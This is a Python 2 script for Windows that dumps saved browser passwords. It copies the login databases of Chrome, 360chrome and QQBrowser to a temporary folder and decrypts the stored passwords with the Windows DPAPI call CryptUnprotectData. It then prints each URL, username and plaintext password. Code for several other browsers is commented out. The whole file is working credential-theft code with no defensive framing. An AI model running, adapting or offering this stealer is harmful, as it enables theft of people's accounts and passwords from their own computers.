#coding:utf-8
import os,sqlite3,win32crypt,shutil
import sys

"""
	chrome
	liebao
	360sec
	360chrome
	QQBrowser
	Z2345
	Sogou

"""
chrome = "\\Google\\Chrome\\User Data\\Default\\"
liebao = "\\liebao\\User Data\\Default\\"
sec360 = "\\360se6\\User Data\\Default\\"
chrome360 = "\\360chrome\\Chrome\\User Data\\Default\\"
QQBrowser = "\\Tencent\\QQBrowser\\User Data\\Default\\"
Z2345 = "\\2345Explorer\\User Data\\Default\\"
Sogou = "\\SogouExplorer\\Webkit\\Default\\"

def passwd_dump(path, name):
	if not os.path.exists(path):
		return
	shutil.copyfile(path, os.getenv("TMP") + "\\" + name)
	connect = sqlite3.connect(os.getenv("TMP") + "\\" + name)
	out = 0
	passwd_out = "\n\n------------------------%s Password Found!------------------------\n\n"%(name)
	for column in connect.execute("select origin_url,username_value,password_value from logins"):
		passwd = win32crypt.CryptUnprotectData(column[2],None,None,None,0)[1]
		if passwd:
			out+=1
			passwd_out += "Url  : " +column[0].encode('936') + "\nUser : " + column[1].encode('936') + "\nPass : " + passwd + "\n\n"
			
	connect.close()
	os.remove(os.getenv("TMP") + "\\" + name)
	print passwd_out
	print "---------------------------Found  %d  Password---------------------------\n"%out

def dump_browsers():
	AppData = os.getenv("LOCALAPPDATA")
	Roaming = os.getenv("AppData")
	#chrome
	
	passwd_db = AppData + chrome + "\\Login Data"
	if os.path.exists(passwd_db):
		passwd_dump(passwd_db, "chrome")

	#liebao
	#if os.path.exists(AppData + liebao):
	#	passwd_db = AppData + liebao + "\\Logos"
	#	passwd_dump(passwd_db, "liebao")

	#360chrome
	if os.path.exists(AppData + chrome360):
		passwd_db = AppData + chrome360 + "\\Login Data"
		passwd_dump(passwd_db, "chrome360")

	#QQBrowser
	if os.path.exists(AppData + QQBrowser):
		passwd_db = AppData + QQBrowser + "\\EncryptedStorage"
		passwd_out = "\n------------------------QQBrowser Password Found!------------------------\n\n"
		shutil.copyfile(passwd_db, os.getenv("TMP")+"\\QQBrowser_pass")
		connect = sqlite3.connect(os.getenv("TMP")+"\\QQBrowser_pass")
		out = 0
		for column in connect.execute("select str1,str2,blob0 from entries"):
			passwd = win32crypt.CryptUnprotectData(column[2],None,None,None,0)[1]
			if passwd:
				out+=1
				passwd_out += "Url  : " +column[0].encode('936') + "\nUser : " + column[1].encode('936') + "\nPawd : " + passwd  + "\n\n"
		connect.close()
		os.remove(os.getenv("TMP")+"\\QQBrowser_pass")
		print passwd_out
		print "---------------------------Found  %d  Password---------------------------\n"%out
	#Z2345
	#if os.path.exists(AppData + Z2345):
	#	passwd_db = AppData + Z2345 + "\\Login DataV2"
	#	passwd_dump(passwd_db, "Z2345")

	#Sogou
	#not support Sougou passwd dump


	#sec360
	#if os.path.exists(Roaming + sec360):
	#	passwd_db = Roaming + sec360 + "\\Login Data"
	#	passwd_dump(passwd_db, "sec360")

def dump_cookie():
	pass

	

	
if __name__ == '__main__':
	dump_browsers()